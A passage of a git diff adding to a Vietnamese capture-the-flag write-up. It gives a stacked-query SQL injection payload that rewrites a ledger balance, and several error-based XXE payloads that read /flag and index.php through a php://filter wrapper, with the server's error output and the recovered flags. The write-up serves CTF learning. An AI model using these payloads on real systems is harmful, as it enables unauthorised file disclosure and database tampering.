@@ -19,4 +19,79 @@
     + Quyết định chơi lun stacked query . update tiền cho mình ban đầu tôi dùng với payload `a"); UPDATE ledger SET amount=1000000-- -` mình sẽ bị -1000000 và người nhận sẽ dc 1000000 .Cứ chuyển qua chuyển lại thì sẽ đc tiền r mua flag thôi `BKSec{now_u_know_RELATIONAL_database}` 
  -  Ngoài ra các bạn có thể sử dụng payload :`"||(SELECT VERSION())||" ` để tìm version cũng như thây đổi 1 chút trong payload để tim các bảng và các cột và values cột nhanh nhất .  
  #          XML Suck(Author: Q5Ca)
- -  Bài này là mình solve cuối cùng , vì mình chưa rành về xxe nên việc làm nó cũng hơi khó khăn với mình . 
+ -  Bài này là mình solve cuối cùng , vì mình chưa rành về `XXE` nên việc làm nó cũng hơi khó khăn với mình . 
+  - Tác giả cho source thì mình biết flag ở source và cái $user ko dc show ra ngoài nên ko thể dùng được` xxe to retrieve files`.
+  - Còn lại 2 kĩ thuật blind và error based .
+    + Dùng Blind thì bị chặn stream http. 
+    + Còn lại error base . ok tiến hành thử file DTD local để exploit , nhưng không có file dtd nào ở local cả. 
+    + Lên gg đọc tài liệu và tìm payload thì phát hiện 1 payload ko cần dtd ở local . 
+ payload : 
+ ```
+ <?xml version="1.0" encoding="UTF-8"?> 
+<!DOCTYPE message[ 
+  <!ELEMENT message ANY >
+  <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "file:///flag">
+  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%NUMBER;
+]> 
+<message>a</message>
+ ```
+ - Ngon rồi ! thử rap vào xem chạy được không nhé!
+ payload:
+ ```
+     <?xml version="1.0" encoding="UTF-8"?> 
+    <!DOCTYPE message[ 
+      <!ELEMENT message ANY >
+      <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "index.php">
+      <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+    &#x25;eval;
+    &#x25;error;
+    '>
+    %NUMBER;
+    ]> 
+    <creds>
+    <user></user>
+    <pass></pass>
+    </creds>
+ ```
+ respont :
+ ```
+ <br />
+<b>Warning</b>:  DOMDocument::loadXML(): Invalid URI: file:///nonexistent/&lt;?php 
+    error_reporting(E_ALL);
+    ini_set( in Entity, line: 3 in <b>/var/www/html/index.php</b> on line <b>9</b><br />
+<br />
+<b>Warning</b>:  DOMDocument::loadXML(): xmlParseEntityDecl: entity error not terminated in Entity, line: 3 in <b>/var/www/html/index.php</b> on line <b>9</b><br />
+<br />
+<b>Warning</b>:  simplexml_import_dom(): Invalid Nodetype to import in <b>/var/www/html/index.php</b> on line <b>10</b><br />
+<br />
+<b>Notice</b>:  Trying to get property of non-object in <b>/var/www/html/index.php</b> on line <b>11</b><br />
+<br />
+<b>Notice</b>:  Trying to get property of non-object in <b>/var/www/html/index.php</b> on line <b>12</b><br />
+You have logged in as user !!!
+ ```
+ - Vậy là thành công r , h chỉ việc dùng wrapper php://filter là móc tất tần tật source code ra !
+ payload ``
+ và 
+ ```
+ <?xml version="1.0" encoding="UTF-8"?> 
+<!DOCTYPE message[ 
+  <!ELEMENT message ANY >
+  <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=index.php">
+  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%NUMBER;
+]> 
+<creds>
+<user></user>
+<pass></pass>
+</creds>
+ ```
+ respont : XZBBTwIxEIXv/ophY7I1gYAHLyIYyHIwLnCQg56asjuUxm7btLsKUf+703U3IfbSTt+br9P38OiODq6AFnpvPfforK+VkWzFF3l+M201ZRQPWLO0VMFpceatOaRDuP3v0FZ2Kq/EiWs05LqbTMjXGrXanyrNCST2GjmaWtVnrq0o0QM7CB2wQ16T76A0wgzixiXWvLCmppbAUpr7fjxWxjV12jeUtiKzwU/ItuvMFk1FXnahjubxodd1znr4EPKnJV3wzXa12cF3X2a7LN8usr638FgGYgdVOY3xA3SgoDhBWST3xibQN2Zdw2gey05xIoQLJZZ/ChZHC8mbbeAoPhAoQIklBQoiQIsbDAZJBzloIQmSLp9fsPiKg6rAk9WJQgmK8lwL/964XBjZCInJTzq9+gU= . 
+ Chỉ việc decode là ra flag :BKSec{XML_is_"ExtensibleMarkupLanguage"}
+ tool: https://www.samltool.com/decode.php
